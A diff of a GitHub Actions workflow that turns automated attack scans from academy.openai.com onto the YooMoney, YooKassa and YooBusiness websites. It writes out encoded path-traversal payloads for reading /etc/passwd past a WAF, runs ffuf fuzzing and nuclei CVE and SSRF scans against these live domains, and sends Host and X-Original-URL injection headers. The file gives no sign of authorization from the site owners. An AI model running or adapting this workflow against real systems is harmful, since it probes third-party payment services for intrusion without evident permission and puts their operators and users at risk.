@@ -1,4 +1,4 @@
-name: "Heavy-Duty Middleware Escalation (Parallel)"
+name: "Heavy-Duty Middleware Escalation — YooMoney"
 
 on:
   workflow_dispatch:
@@ -8,71 +8,112 @@ permissions:
   issues: write
   actions: read
 
+env:
+  TARGETS_FILE: targets.txt
+
 jobs:
-  # Job 1: Fuzzing for Path Traversal & Logic Bypass
+
+  prep_targets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 🧬 Build Scope Targets
+        run: |
+          cat <<EOF > $TARGETS_FILE
+          https://yoomoney.ru
+          https://yookassa.ru
+          https://yoobusiness.ru
+          EOF
+      - uses: actions/upload-artifact@v4
+        with:
+          name: targets
+          path: ${{ env.TARGETS_FILE }}
+
   fuzz_traversal:
+    needs: prep_targets
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+
+      - uses: actions/download-artifact@v4
+        with:
+          name: targets
+
       - name: Install FFUF
-        run: go install github.com/ffuf/ffuf/v2@latest && echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+        run: |
+          go install github.com/ffuf/ffuf/v2@latest
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
       - name: 📝 WAF Bypass Payloads
         run: |
           cat <<EOF > payloads.txt
           ..%2f..%2f..%2fetc/passwd
-          ..%5c..%5c..%5cwindows/win.ini
+          ..%252f..%252fetc/passwd
           .%2e/%2e%2e/%2e%2e/etc/passwd
-          ..%252f..%252f..%252fetc/passwd
           ..%c0%af..%c0%afetc/passwd
-          %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+          %2e%2e%2f%2e%2e%2fetc%2fpasswd
           EOF
 
       - name: 🎯 Parallel Fuzz
         run: |
-          ffuf -u "https://academy.openai.com/?amp=FUZZ" \
-               -w payloads.txt -mc 200,500,403 -v -o traversal_results.json
+          while read target; do
+            ffuf -u "$target/FUZZ" \
+              -w payloads.txt \
+              -mc 200,403,500 \
+              -rate 4 \
+              -o "traversal_$(echo $target | sed 's/https:\/\///').json"
+          done < targets.txt
 
-      - name: 📤 Upload Results
-        uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@v4
         with:
           name: traversal-results
-          path: traversal_results.json
+          path: traversal_*.json
 
-  # Job 2: Testing for SSRF and Next.js Specific CVEs
   nuclei_scan:
+    needs: prep_targets
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Install Nuclei
-        run: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+      - uses: actions/download-artifact@v4
+        with:
+          name: targets
 
-      - name: ☢️ Scan for SSRF/Next.js CVEs
+      - name: Install Nuclei
         run: |
-          nuclei -u "https://academy.openai.com/?amp=test" \
+          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+
+      - name: ☢️ CVE / SSRF Scan
+        run: |
+          nuclei -l targets.txt \
             -t http/vulnerabilities/nextjs/ \
-            -t http/cves/2024/CVE-2024-34351.yaml \
+            -t http/cves/ \
+            -rate-limit 5 \
             -o nuclei_results.txt
 
-      - name: 📤 Upload Results
-        uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@v4
         with:
           name: nuclei-results
           path: nuclei_results.txt
 
-  # Job 3: Advanced Header Smuggling
   header_smuggling:
+    needs: prep_targets
     runs-on: ubuntu-latest
     steps:
-      - name: 🕵️ Test Header Interaction
+      - uses: actions/download-artifact@v4
+        with:
+          name: targets
+
+      - name: 🕵️ Header & Host Injection Tests
         run: |
-          # Testing for HTTP Parameter Pollution and Host Injection
-          curl -v -I "https://academy.openai.com/?amp=1234" -H "X-Forwarded-Host: 127.0.0.1" > header_test_1.txt
-          curl -v -I "https://academy.openai.com/?amp=1234&amp=../../etc/passwd" > header_test_2.txt
-          
-      - name: 📤 Upload Results
-        uses: actions/upload-artifact@v4
+          while read target; do
+            curl -k -I "$target" \
+              -H "X-Forwarded-Host: 127.0.0.1" \
+              -H "X-Original-URL: /admin" \
+              -H "X-Rewrite-URL: /admin" \
+              >> header_tests.txt
+          done < targets.txt
+
+      - uses: actions/upload-artifact@v4
         with:
           name: header-smuggling-results
-          path: header_test_*.txt
-          
+          path: header_tests.txt
